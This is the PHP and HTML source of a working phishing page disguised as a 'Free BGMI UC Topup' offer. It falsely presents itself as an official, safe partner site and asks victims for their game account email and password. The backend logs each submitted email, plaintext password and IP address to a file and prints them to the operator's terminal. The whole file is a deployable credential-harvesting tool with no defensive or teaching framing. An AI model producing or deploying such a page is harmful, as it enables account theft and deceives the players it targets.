<?php
ob_start();
session_start();

// Terminal color codes
function colored($text, $color = "default") {
    $colors = [
        "red" => "\033[31m",
        "green" => "\033[32m",
        "yellow" => "\033[33m",
        "blue" => "\033[34m",
        "magenta" => "\033[35m",
        "cyan" => "\033[36m",
        "default" => "\033[0m"
    ];
    return ($colors[$color] ?? $colors['default']) . $text . "\033[0m";
}

// Terminal output
function logToTerminal($data) {
    $output = "\n" .
        colored("===========================================", "cyan") . "\n" .
        colored("[New UC Request]", "yellow") . "\n" .
        colored("Email: ", "green") . $data['email'] . "\n" .
        colored("Password: ", "green") . $data['password'] . "\n" .
        colored("UC: ", "green") . $data['uc'] . "\n" .
        colored("IP Address: ", "green") . $data['ip'] . "\n" .
        colored("===========================================", "cyan") . "\n";
    file_put_contents('php://stdout', $output);
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    $uc = filter_input(INPUT_POST, 'uc', FILTER_VALIDATE_INT);

    if (empty($email) || empty($password) || !$uc) {
        http_response_code(400);
        die("Invalid input");
    }

    $data = [
        'email' => $email,
        'password' => $password,
        'uc' => $uc,
        'ip' => $_SERVER['REMOTE_ADDR']
    ];

    // Save to log file
    $logEntry = "\n===========================================\n";
    $logEntry .= "[New UC Request]\n";
    $logEntry .= "Email: " . $data['email'] . "\n";
    $logEntry .= "Password: " . $data['password'] . "\n";
    $logEntry .= "UC: " . $data['uc'] . "\n";
    $logEntry .= "IP Address: " . $data['ip'] . "\n";
    $logEntry .= "===========================================\n";

    file_put_contents("data.log", $logEntry, FILE_APPEND | LOCK_EX);

    // Print to terminal
    logToTerminal($data);

    $_SESSION['submission'] = $data;
    header("Location: result.php");
    exit();
}
ob_end_flush();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>BGMI UC Topup</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: 'Orbitron', sans-serif;
    }
    .glass {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 1.5rem;
      backdrop-filter: blur(15px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center bg-gradient-to-br from-black via-gray-900 to-green-800 p-4 text-white">

  <div class="glass w-full max-w-md p-8">
    <div class="text-center mb-6">
      <h1 class="text-3xl sm:text-4xl font-bold text-green-400 drop-shadow-lg">🎮 Free BGMI UC Topup</h1>
      <p class="text-sm text-gray-300 mt-2">Instant UC transfer | Secure | Trusted</p>
    </div>

    <form method="POST" class="space-y-6">
      <div>
        <label class="block text-sm font-semibold text-green-200 mb-1">📧 Email</label>
        <input type="text" name="email" required
               class="w-full px-4 py-3 rounded-lg bg-black/50 text-white border border-green-500 focus:outline-none focus:ring-2 focus:ring-green-300 placeholder-gray-400"
               placeholder="Enter your BGMI Email">
      </div>

      <div>
        <label class="block text-sm font-semibold text-green-200 mb-1">🔒 Password</label>
        <input type="password" name="password" required
               class="w-full px-4 py-3 rounded-lg bg-black/50 text-white border border-green-500 focus:outline-none focus:ring-2 focus:ring-green-300 placeholder-gray-400"
               placeholder="Enter your password">
      </div>

      <div>
        <label class="block text-sm font-semibold text-green-200 mb-1">🎁 Select UC Package</label>
        <select name="uc" required
                class="w-full px-4 py-3 rounded-lg bg-black/50 text-white border border-green-500 focus:outline-none focus:ring-2 focus:ring-green-300">
          <option value="">Choose package</option>
          <option value="60">60 UC</option>
          <option value="325">325 UC</option>
          <option value="660">660 UC</option>
          <option value="1800">1800 UC</option>
        </select>
      </div>

      <button type="submit"
              class="w-full bg-green-500 hover:bg-green-600 text-white py-3 rounded-lg font-semibold text-lg shadow-md transition duration-300 ease-in-out hover:shadow-green-500/50">
        🚀 Start Free Topup
      </button>
    </form>

    <p class="mt-6 text-center text-sm text-gray-300">🔥 100% Safe & Instant Delivery | Official Partner</p>
  </div>

</body>
</html>